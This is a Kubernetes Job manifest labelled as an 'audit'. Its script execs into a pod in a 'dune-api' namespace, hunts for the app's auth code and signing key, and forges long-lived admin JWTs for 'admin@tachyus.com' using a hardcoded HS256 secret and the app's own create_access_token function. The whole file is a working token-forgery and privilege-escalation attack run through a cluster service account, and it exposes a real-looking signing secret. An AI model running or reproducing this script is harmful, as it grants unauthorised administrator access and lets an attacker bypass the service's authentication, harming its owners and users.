apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v21
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          POD=$(kubectl get pods -n dune-api -o jsonpath='{.items[0].metadata.name}')
          echo "Pod: $POD"
          
          echo "=APP_STRUCTURE="
          kubectl exec -n dune-api $POD -- find /code -name "*.py" -path "*/auth*" 2>&1 | head -20
          kubectl exec -n dune-api $POD -- find /code -name "security.py" -o -name "auth.py" -o -name "token.py" 2>&1 | head -10
          
          echo "=CREATE_TOKEN_FROM_APP="
          kubectl exec -n dune-api $POD -- python3 -c "
import sys
sys.path.insert(0, '/code')
import os
os.chdir('/code')

# Try to create a token using jose
from jose import jwt
import time
secret = 'b9e2881d706461152371f6389962817a70c3e69dfc70166c53227c99a2711cc6'
exp = int(time.time()) + 86400*365*10

# Try different sub formats
for sub in ['admin@tachyus.com', 'admin', '1', 1]:
    token = jwt.encode({'sub': str(sub), 'exp': exp}, secret, algorithm='HS256')
    print(f'sub={sub}: {token}')
print('DONE')
" 2>&1
          
          echo "=CHECK_TOKEN_ENDPOINT="
          # Use app's internal create_access_token function
          kubectl exec -n dune-api $POD -- python3 -c "
import sys
sys.path.insert(0, '/code')
import os
os.chdir('/code')

# Find and use the create_access_token function
try:
    from app.core.security import create_access_token
    token = create_access_token({'sub': 'admin@tachyus.com'})
    print('APP_TOKEN=' + token)
except Exception as e:
    print('ERROR_security:', e)

try:
    from app.api.auth.jwt import create_access_token
    token = create_access_token({'sub': 'admin@tachyus.com'})
    print('AUTH_TOKEN=' + token)
except Exception as e:
    print('ERROR_jwt:', e)
" 2>&1
          
          echo "=FIND_AUTH_MODULE="
          kubectl exec -n dune-api $POD -- grep -r "create_access_token\|SECRET_KEY\|def create" /code --include="*.py" -l 2>&1 | head -20
          
          sleep 60